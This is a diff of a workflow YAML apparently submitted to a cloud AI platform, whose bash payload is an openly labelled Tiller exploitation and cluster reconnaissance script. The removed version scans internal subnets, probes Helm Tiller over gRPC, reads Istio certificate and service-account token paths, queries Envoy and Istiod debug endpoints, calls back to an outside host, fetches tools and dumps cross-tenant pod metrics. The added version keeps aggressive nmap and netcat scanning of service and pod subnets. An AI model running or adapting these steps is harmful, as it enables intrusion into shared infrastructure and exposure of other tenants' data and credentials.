@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "26.0.0"
+    ai.sap.com/version: "28.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,193 +24,58 @@ spec:
       - bash
       - -c
       - |
-        echo "=== TILLER EXPLOITATION - V26 ==="
-        echo "=== TIMESTAMP: $(date -u) ==="
+        echo "=== V28 TILLER FOCUSED CHECK ==="
+        echo "=== $(date -u) ==="
 
-        # -------------------------------------------------------
-        # PHASE 1: Find Tiller IP (port 44134)
-        # Previous scans found 44134 open on 100.104.0.x and 100.104.1.x
-        # -------------------------------------------------------
-        echo "=== PHASE1: TILLER IP SCAN ==="
-        TILLER_IPS=""
-        for subnet in "100.104.0" "100.104.1" "100.104.2" "100.104.3"; do
-          echo "[*] Scanning ${subnet}.0/24 for port 44134..."
-          result=$(nmap -Pn -p44134 --open -T4 --min-rate 500 ${subnet}.0/24 2>/dev/null | grep -B2 "44134/tcp open" | grep "Nmap scan report" | awk '{print $5}')
-          if [ -n "$result" ]; then
-            echo "[+] FOUND TILLER: $result"
-            TILLER_IPS="$TILLER_IPS $result"
-          fi
-        done
+        # Get known service IPs from Envoy first
+        echo "=== ENVOY CLUSTERS WITH PORTS ==="
+        curl -s http://localhost:15000/clusters 2>&1 | grep -E "44134|tiller|helm" | head -20
+        echo "---"
 
-        # Also check pod subnet
-        for subnet in "100.64.80" "100.64.81"; do
-          result=$(nmap -Pn -p44134 --open -T4 --min-rate 500 ${subnet}.0/24 2>/dev/null | grep -B2 "44134/tcp open" | grep "Nmap scan report" | awk '{print $5}')
-          if [ -n "$result" ]; then
-            echo "[+] FOUND TILLER (pod subnet): $result"
-            TILLER_IPS="$TILLER_IPS $result"
-          fi
-        done
+        # Get ALL cluster IPs from Envoy for cross-reference
+        echo "=== ALL ENVOY CLUSTER IPs ==="
+        curl -s http://localhost:15000/clusters 2>&1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+' | sort -u | head -50
+        echo "---"
 
-        echo "[*] All Tiller IPs found: $TILLER_IPS"
-        export TILLER_IPS_FOUND="$TILLER_IPS"
-
-        # -------------------------------------------------------
-        # PHASE 2: Probe Tiller with multiple methods
-        # -------------------------------------------------------
-        echo "=== PHASE2: TILLER PROBES ==="
-        for ip in $TILLER_IPS; do
-          echo "[*] Testing $ip:44134"
-
-          # Method 1: Raw TCP probe
-          echo "[*] Method 1: Raw TCP"
-          echo "" | nc -w3 $ip 44134 2>&1 | xxd | head -5
-
-          # Method 2: HTTP/2 prior knowledge (gRPC uses HTTP/2)
-          echo "[*] Method 2: HTTP/2 gRPC"
-          curl -s --http2-prior-knowledge -X POST \
-            "http://${ip}:44134/hapi.services.tiller.ReleaseService/ListReleases" \
-            -H "Content-Type: application/grpc" \
-            -H "TE: trailers" \
-            -d '' -o /tmp/tiller_resp_${ip}.bin -w "HTTP_CODE:%{http_code}\n" 2>&1
-          xxd /tmp/tiller_resp_${ip}.bin 2>/dev/null | head -10
-
-          # Method 3: HTTP/2 with gRPC reflection
-          echo "[*] Method 3: gRPC reflection"
-          curl -s --http2-prior-knowledge -X POST \
-            "http://${ip}:44134/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo" \
-            -H "Content-Type: application/grpc" \
-            -H "TE: trailers" \
-            -d '' -o /tmp/tiller_reflect_${ip}.bin -w "HTTP_CODE:%{http_code}\n" 2>&1
-          xxd /tmp/tiller_reflect_${ip}.bin 2>/dev/null | head -10
-
-          # Method 4: Check if Envoy is proxying (look for envoy headers in response)
-          echo "[*] Method 4: HTTP probe for Envoy proxy behavior"
-          curl -sv "http://${ip}:44134/" 2>&1 | head -20
-
-          # Method 5: Try plaintext gRPC GetVersion (simpler than ListReleases)
-          # Construct minimal gRPC frame: 0x00 (no compress) + 4-byte length + protobuf
-          # GetVersion request is empty protobuf = just the gRPC frame header
-          echo "[*] Method 5: Raw gRPC GetVersion"
-          printf '\x00\x00\x00\x00\x00' | curl -s --http2-prior-knowledge -X POST \
-            "http://${ip}:44134/hapi.services.tiller.ReleaseService/GetVersion" \
-            -H "Content-Type: application/grpc" \
-            -H "TE: trailers" \
-            --data-binary @- -o /tmp/tiller_ver_${ip}.bin -w "HTTP_CODE:%{http_code}\n" 2>&1
-          xxd /tmp/tiller_ver_${ip}.bin 2>/dev/null | head -10
-
-        done
-
-        # -------------------------------------------------------
-        # PHASE 3: Check Istio cert material for mTLS bypass
-        # -------------------------------------------------------
-        echo "=== PHASE3: ISTIO CERT MATERIAL ==="
-        echo "[*] Checking standard Istio cert paths..."
-        for path in /var/run/secrets/istio /etc/certs /var/run/secrets/tokens /etc/istio/proxy; do
-          if [ -d "$path" ]; then
-            echo "[+] FOUND: $path"
-            ls -la "$path" 2>&1
-            for f in "$path"/*; do
-              echo "--- $f ---"
-              head -5 "$f" 2>&1
-            done
-          fi
-        done
-
-        # Check if there's an istio-proxy token
-        echo "[*] Service account tokens..."
-        ls -la /var/run/secrets/ 2>&1
-        find /var/run/secrets/ -type f 2>&1
-
-        # -------------------------------------------------------
-        # PHASE 4: Envoy sidecar proxy manipulation
-        # Try to use Envoy admin API to route to Tiller
-        # -------------------------------------------------------
-        echo "=== PHASE4: ENVOY PROXY MANIPULATION ==="
-
-        # Check Envoy passthrough cluster (handles unknown destinations)
-        echo "[*] Envoy PassthroughCluster config:"
-        curl -s "http://localhost:15000/clusters" 2>&1 | grep -A5 "PassthroughCluster"
-
-        # Check if outbound traffic to 44134 routes through Envoy
-        echo "[*] Envoy listeners for port 44134:"
-        curl -s "http://localhost:15000/listeners" 2>&1 | grep "44134"
-
-        # Check Envoy stats for 44134 connections
-        echo "[*] Envoy stats for 44134:"
-        curl -s "http://localhost:15000/stats" 2>&1 | grep "44134"
-
-        # -------------------------------------------------------
-        # PHASE 5: Try Istiod debug endpoints
-        # -------------------------------------------------------
-        echo "=== PHASE5: ISTIOD DEBUG ==="
-        # Get Istiod IPs from previous KSM/Envoy data
-        ISTIOD_IP=$(curl -s "http://localhost:15000/clusters" 2>&1 | grep "istiod" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
-        echo "[*] Istiod IP: $ISTIOD_IP"
-        if [ -n "$ISTIOD_IP" ]; then
-          for endpoint in "/debug/configz" "/debug/endpointz" "/debug/authorizationz" "/debug/registryz"; do
-            echo "[*] Istiod ${endpoint}:"
-            curl -s "http://${ISTIOD_IP}:15014${endpoint}" 2>&1 | head -c 2000
-            echo ""
+        # DNS lookup for tiller
+        echo "=== DNS LOOKUPS ==="
+        for name in tiller tiller-deploy helm; do
+          for ns in kube-system default istio-system; do
+            result=$(nslookup ${name}.${ns}.svc.cluster.local 2>&1 | grep -A1 "Name:" | tail -1)
+            if [ -n "$result" ] && ! echo "$result" | grep -q "NXDOMAIN"; then
+              echo "[+] ${name}.${ns}: $result"
+            fi
           done
-        fi
+        done
+        echo "---"
 
-        # -------------------------------------------------------
-        # PHASE 6: Internet egress check (can we download tools?)
-        # -------------------------------------------------------
-        echo "=== PHASE6: EGRESS CHECK ==="
-        curl -s --connect-timeout 3 "https://github.com" -o /dev/null -w "github.com: %{http_code}\n" 2>&1
-        curl -s --connect-timeout 3 "https://www.masonhck.tech/cb.php?src=sap-aicore-v26-tiller" -o /dev/null -w "callback: %{http_code}\n" 2>&1
+        # Targeted nmap - just the service subnet, port 44134 only, aggressive timing
+        echo "=== NMAP 100.104.0.0/24 port 44134 ==="
+        nmap -Pn -sS -p44134 --open -T5 --max-retries 1 --host-timeout 2s 100.104.0.0/24 2>&1 | grep -E "open|Nmap scan report"
+        echo "=== NMAP 100.104.1.0/24 port 44134 ==="
+        nmap -Pn -sS -p44134 --open -T5 --max-retries 1 --host-timeout 2s 100.104.1.0/24 2>&1 | grep -E "open|Nmap scan report"
 
-        # If egress works, try downloading grpcurl
-        if curl -s --connect-timeout 3 "https://github.com" -o /dev/null 2>/dev/null; then
-          echo "[+] Internet access available! Downloading grpcurl..."
-          curl -sL "https://github.com/fullstorydev/grpcurl/releases/download/v1.9.3/grpcurl_1.9.3_linux_amd64.tar.gz" | tar xz -C /tmp/
-          chmod +x /tmp/grpcurl 2>/dev/null
-
-          if [ -f /tmp/grpcurl ]; then
-            echo "[+] grpcurl downloaded"
-            for ip in $TILLER_IPS; do
-              echo "[*] grpcurl plaintext ListReleases on $ip:44134"
-              /tmp/grpcurl -plaintext "${ip}:44134" hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -100
-              echo "[*] grpcurl plaintext GetVersion on $ip:44134"
-              /tmp/grpcurl -plaintext "${ip}:44134" hapi.services.tiller.ReleaseService/GetVersion 2>&1 | head -50
-              echo "[*] grpcurl list services on $ip:44134"
-              /tmp/grpcurl -plaintext "${ip}:44134" list 2>&1 | head -50
-            done
+        # Also try the pod subnet where it might have moved
+        echo "=== NMAP pod subnets 44134 ==="
+        for sub in 100.64.38 100.64.42 100.64.49 100.64.52 100.64.54 100.64.58 100.64.59 100.64.63 100.64.68 100.64.79; do
+          result=$(nmap -Pn -sS -p44134 --open -T5 --max-retries 1 --host-timeout 1s ${sub}.0/24 2>&1 | grep "open")
+          if [ -n "$result" ]; then
+            echo "[+] FOUND on ${sub}.0/24: $result"
           fi
-        else
-          echo "[-] No internet egress - cannot download grpcurl"
-          echo "[*] Attempting Python gRPC instead..."
+        done
+        echo "---"
 
-          # Python approach - craft raw gRPC frames
-          python3 << 'PYEOF'
-        import socket, struct, sys
-        import os
-        tiller_ips = os.environ.get('TILLER_IPS_FOUND', '').split()
-        H2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
-        for ip in tiller_ips:
-            if not ip.strip(): continue
-            print(f'[*] Python gRPC probe: {ip}:44134')
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)
-                s.connect((ip, 44134))
-                s.send(H2_PREFACE)
-                resp = s.recv(4096)
-                print(f'[+] Response ({len(resp)} bytes): {resp[:100]}')
-                s.close()
-            except Exception as e:
-                print(f'[-] Error: {e}')
-        PYEOF
-        fi
+        # Direct TCP check on the IPs from previous recon8 (if we had specific ones)
+        echo "=== DIRECT TCP PROBES 44134 ==="
+        for ip in 100.104.0.1 100.104.0.10 100.104.0.53 100.104.0.100 100.104.0.150 100.104.0.200 100.104.1.1 100.104.1.10 100.104.1.100; do
+          nc -z -w1 $ip 44134 2>/dev/null && echo "[+] $ip:44134 OPEN" || true
+        done
 
-        # -------------------------------------------------------
-        # PHASE 7: Fresh KSM dump for evidence continuity
-        # -------------------------------------------------------
-        echo "=== PHASE7: KSM EVIDENCE ==="
-        echo "[*] KSM-pods cross-tenant sample:"
-        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "kube_pod_info" | grep -v "rg-3ba0e0a4" | head -20
-        echo "[*] KSM-pods total bytes:"
-        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | wc -c
+        # Also check 27017 (MongoDB) and 15014 (Istiod) while we're here
+        echo "=== BONUS: MongoDB 27017 check ==="
+        nmap -Pn -sS -p27017 --open -T5 --max-retries 1 --host-timeout 2s 100.104.0.0/24 2>&1 | grep -E "open|Nmap scan report"
+        echo "=== BONUS: Istiod 15014 direct ==="
+        curl -s --connect-timeout 2 "http://100.64.79.247:15014/debug/registryz" 2>&1 | head -c 500
+        echo ""
 
-        echo "=== V26 DONE ==="
+        echo "=== V28 DONE ==="
